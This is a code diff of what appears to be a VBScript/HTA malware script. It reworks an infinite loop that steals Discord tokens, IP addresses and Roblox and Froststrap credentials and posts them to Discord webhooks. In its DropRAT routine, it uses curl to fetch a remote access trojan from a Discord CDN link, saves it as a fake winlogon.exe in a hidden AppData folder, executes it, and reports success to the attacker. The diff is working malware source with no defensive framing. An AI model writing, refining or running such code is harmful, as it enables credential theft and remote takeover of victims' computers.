@@ -27,20 +27,19 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. INFINITE Re-grab chain ---
+' --- 2. INFINITE Re-grab & RAT Loop ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re-grab " & runCount, "PC: " & PC & " | User: " & USER, 10181046, RE_WH)
     
-    ' Pass RE_WH (Re-grab) to the grab functions inside the loop
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
     
-    ' Attempt RAT download EVERY re-grab loop
+    ' Attempt RAT download EVERY loop until success
     Call DropRAT
     
     ' Sleep for 2.5 minutes (150 seconds)
@@ -49,38 +48,33 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Plain URL, always sends download message) ---
+' --- RAT DROP (Original Curl Method) ---
 Sub DropRAT()
-    ' Plain URL exactly as you provided
+    ' Plain URL
     Dim exeUrl : exeUrl = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dicecheck.exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
 
-    ' Hide in AppData
     Dim hidDir : hidDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
     If Not fso.FolderExists(hidDir) Then fso.CreateFolder(hidDir)
     
     Dim op : op = hidDir & "\winlogon.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Send "Downloading RAT" message BEFORE the download
-    Call PostEmbed(":rocket: Downloading RAT", "Fetching payload...", 10181046)
+    ' Spam "Fetching Payload" (will stop when success)
+    Call PostEmbed(":package: Fetching Payload", "Attempting RAT download...", 10181046)
 
-    ' Download via BitsTransfer
-    Dim psCmd : psCmd = "Import-Module BitsTransfer -ErrorAction SilentlyContinue;" & _
-                        "Start-BitsTransfer -Source '" & exeUrl & "' -Destination '" & op & "' -ErrorAction SilentlyContinue;"
-                        
-    Dim psf : psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dl.ps1"
-    Dim f : Set f = fso.CreateTextFile(psf, True)
-    f.Write psCmd
-    f.Close
-    Set f = Nothing
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
+    ' Use original curl method
+    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & exeUrl & """"
+    sh.Run dlCmd, 0, True
 
-    ' Only send "RAT Downloaded" if the file exists and is valid
+    ' Check for success
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 100000 Then
+            Dim dsize : dsize = fso.GetFile(op).Size
+            Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
+            
+            ' Execute via WMI
             Call RunCmd("""" & op & """")
-            Call PostEmbed(":white_check_mark: RAT Downloaded", "Payload deployed and executed.", 10181046)
+            Exit Sub ' Stop spamming once successful
         End If
     End If
 End Sub
